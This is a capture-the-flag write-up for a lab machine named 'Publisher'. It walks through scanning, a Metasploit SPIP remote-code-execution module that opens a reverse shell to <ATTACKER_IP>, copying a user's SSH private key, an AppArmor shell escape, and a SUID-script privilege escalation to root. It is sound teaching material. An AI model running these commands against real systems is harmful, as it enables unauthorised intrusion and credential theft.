# Scenario

The "Publisher" CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system's security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.

# Enumeration

## \[+] 10.10.32.210 - publisher.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.32.210 publisher.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.32.210
```

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] publisher.thm

Here we will find an uncustomized [Spip](https://www.spip.net/en_rubrique25.html) installation:

![a7fadfb5ccdba390b72eec4cdd7dce5d.png](/resources/da0c9ecd83c34b3893a6e7aae00445d3.png)

Nothing here, so we'll do some directory/file fuzzing using [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt):

```sh
feroxbuster -u http://publisher.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-www-ferox.txt
```

There will be a lot of output, but if we start with the `/spip` directory we will find a blog post:

Pressing `CTRL + U` will allow us to view the source code for this web page, where we will find the version number on line 96:

# Initial Foothold

### \[-] www-data\@publisher

To get a reverse shell, I found that Metasploit was the best option in this case. Let's start by running Metasploit and then selecting the RCE for SPip:

```sh
msfconsole
use exploit/unix/webapp/spip_rce_form
```

Next, we check the settings using the `options` command and set the following options:

```sh
options
set RHOSTS publisher.thm
set TARGETURI /spip
set LHOST <ATTACKER_IP>
```

After configuring the exploit, we can use the `run` command and after a few seconds we should get a meterpreter shell:

![85919d788252b18de78cec45803a58f0.png](/resources/44e664d0ced3413389f4f00d60071c97.png)

### \[-] think\@publisher

Currently we are in the `/home/think/spip/spip` directory. We will need to change our directory to `/home/think/` to find the flag and the SSH key:

```sh
cd /home/think/
ls -lah
cat user.txt
cat .ssh/id_rsa
```

![7877d2a9e7c0dfadf30e821471d9cf33.png](/resources/c89828341b3e4952944c09ee6f63fd4b.png)

![83d604741e797292984b27e0ab9ed95e.png](/resources/21f644856c3c45adbbca0681450e8e63.png)

Copy and paste the SSH key into a text file named "`think.key`" on the attacking machine then use `chmod` to give the key proper permissions before connecting as the user `think`:

```sh
chmod 600 think.key
ssh -i think.key think@$RHOSTS
```

Checking the `/etc/passwd` file shows our current user "`think`" is not in a regular bash shell:

![b53bf5db54e2b8ac3e1dce0a1da6b1cb.png](/resources/4939cc596b4e426fbbfda12dd76eea88.png)

If we try to write to directories that we have write access to (i.e. `/tmp` or `/home/think/`), we will find that we are currently unable to do so. Let's check to see if [AppArmor](https://apparmor.net/) has been configured by checking the `/etc/apparmor.d/` directory for configuration profiles, where we will find a profile for the `ash` shell that we are currently in:

```sh
ls -lah /etc/apparmor.d/
```

![62bd098e75785421c54313eab6f1e0ef.png](/resources/da491e1f8ab6483fba0d732fad618132.png)

Checking the profile shows two directories that have not been properly configured. The other directories that end in `/**` deny write access to the entire directory because of the `*` wildcard character and the `/` means everything inside the directory.

The directories, `/dev/shm` and `/var/tmp` do not end in `/**`, so the directory is still writeable:

```sh
cat /etc/apparmor.d/usr.sbin.ash
```

![eadfa24c0f307e956be366c65710dc59.png](/resources/a6c57bfcb2b54bb8a07f8a10e314f78a.png)

We can change our current directory to either one, I chose `/var/tmp`. Then we will use the cp command to copy the `/bin/bash` binary to `/var/tmp`:

```sh
cd /var/tmp
cp /bin/bash .
```

![c58cf25d121738ce814226f3a0748680.png](/resources/af307299a1694b7b9d73e903a6ff2f27.png)

When we run this copy of the bash shell, we will break out of the restrictions that are applied on the `ash` shell:

```sh
./bash
```

# Privilege Escalation

### \[-] root\@publisher

To escalate our privileges to `root`, we will first check to see if there are any binaries with the [SUID bit](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit) set for us to exploit using the [find](https://linux.die.net/man/1/find) command:

```sh
find / -type f -perm /4000 2>/dev/null
```

After letting the `find` command finish, we will see an unusual binary, `/usr/sbin/run_container`:
![baa34cd45edd45b3e7402eefbf471437.png](/resources/4e6eb7b53cce406e80c7cd92d6a916ec.png)

Using `cat` to see if we can find any human readable output reveals a bash script running with the `-p` flag which will maintain the permissions of the user that ran the command:

```sh
cat /usr/sbin/run_container
```

![599bf50ea9b5d05da54815fcb20ea3af.png](/resources/e0828f8fa1fd44329a50bb1477f478a0.png)

If we check the permissions using `ls`, we will see that this binary has th SUID bit set as well:

![a762cd1b2e1ea9c090ef9e5324e60098.png](/resources/bc8386db20ec4a618d4d3947b645f328.png)

Next, let's check the permissions of the script that the binary is running to see if we can write to it and inject malicious code:

```sh
ls -lah /opt/run_container.sh
```

![04a76ce83a6959e678656ea6b812721a.png](/resources/8f12d50eef404e16b56cc13e4240c1cb.png)

Combining these, we can create a copy of the bash shell with the SUID bit set which will give us root permissions if we run it with the `-p` flag.

First, we will edit the `/opt/run_container.sh` script using [nano](https://linux.die.net/man/1/nano):

```sh
nano /opt/run_container.sh
```

On the second line, we will use the `cp` command to copy `/bin/bash` to `/var/tmp` with the name `bash4755`, then we use the double ampersand (`&&`) to execute another command right after, `chmod` will give the SUID bit to the `bash7455` binary:

![9753ac14a4f391c7f5b44e0de843b238.png](/resources/23920bdaf80a4a6eaac7380f7b338fa4.png)

Now, when we run the `/usr/sbin/run_container` binary it will create a copy of bash with the SUID bit set to the `/var/tmp/` directory and since we didn't modify the rest of the script, it will continue to operate as normal where we just need to enter a blank name and select option 5 or `CTRL + C` to exit.

When we run `ls` again we will find the `bash4755` binary with the SUID bit set:

![580fbf8c9e7af2cd551735343931425d.png](/resources/63627bfc8e4d48fd8f85c9a97330cf66.png)

Running this bash shell with the `-p` flag will set our effective UID to 0, essentially making us root:

```sh
./bash4755 -p
```

We will find the last flag in `/root/root.txt`:

![e8519b88c8febb35e324a93f5f21157f.png](/resources/ee0a11b0d0b84b98b802f39b5ecbaacf.png)
